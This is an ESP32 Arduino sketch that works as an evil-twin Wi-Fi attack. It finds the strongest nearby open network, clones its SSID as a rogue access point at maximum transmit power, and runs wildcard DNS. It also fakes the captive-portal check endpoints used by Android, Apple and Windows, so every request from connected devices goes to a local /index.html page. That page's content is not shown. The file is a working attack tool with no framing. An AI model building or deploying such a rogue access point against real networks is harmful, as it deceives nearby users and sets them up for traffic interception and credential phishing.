#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

#define LED_TX 12
#define LED_PWR 14

IPAddress mainPortalIP(192, 168, 4, 1);
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer webServer(80);

String clonedSSID = "";
bool apStarted = false;

void setup() {
  Serial.begin(115200);
  pinMode(LED_TX, OUTPUT);
  pinMode(LED_PWR, OUTPUT);
  digitalWrite(LED_PWR, HIGH);


  esp_wifi_set_max_tx_power(84);

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, true);
  delay(1000);

  Serial.println("Scanning for open networks...");
  int n = WiFi.scanNetworks();
  int bestRSSI = -1000;
  int bestIndex = -1;

  for (int i = 0; i < n; i++) {
    if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
      int rssi = WiFi.RSSI(i);
      Serial.printf("Found open SSID: %s (%d dBm)\n", WiFi.SSID(i).c_str(), rssi);
      if (rssi > bestRSSI) {
        bestRSSI = rssi;
        bestIndex = i;
      }
    }
  }

  if (bestIndex == -1) {
    Serial.println("No open networks found. Rebooting...");
    delay(3000);
    ESP.restart();
  }

  clonedSSID = WiFi.SSID(bestIndex);
  Serial.print("Connecting to: ");
  Serial.println(clonedSSID);
  WiFi.begin(clonedSSID.c_str());

  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
    delay(500);
    Serial.print(".");
  }
  Serial.println();

  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(clonedSSID.c_str());
  Serial.print("AP Cloned: ");
  Serial.println(clonedSSID);
  apStarted = true;

  dnsServer.start(DNS_PORT, "*", mainPortalIP);
  Serial.print("DNS redirecting to ");
  Serial.println(mainPortalIP.toString());

  webServer.on("/generate_204", []() {
    webServer.sendHeader("Location", "http://" + mainPortalIP.toString() + "/index.html", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.on("/redirect", []() {
    webServer.sendHeader("Location", "http://" + mainPortalIP.toString() + "/index.html", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.on("/hotspot-detect.html", []() {
    webServer.sendHeader("Location", "http://" + mainPortalIP.toString() + "/index.html", true);
    webServer.send(302, "text/html", "<html><body>You are being redirected</body></html>");
  });

  webServer.on("/ncsi.txt", []() {
    webServer.send(200, "text/plain", "Microsoft NCSI");
  });

  webServer.on("/connecttest.txt", []() {
    webServer.send(200, "text/plain", "Microsoft Connect Test");
  });

  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "http://" + mainPortalIP.toString() + "/index.html", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  int clientCount = WiFi.softAPgetStationNum();
  digitalWrite(LED_TX, clientCount > 0 ? HIGH : LOW);

  delay(200);
}
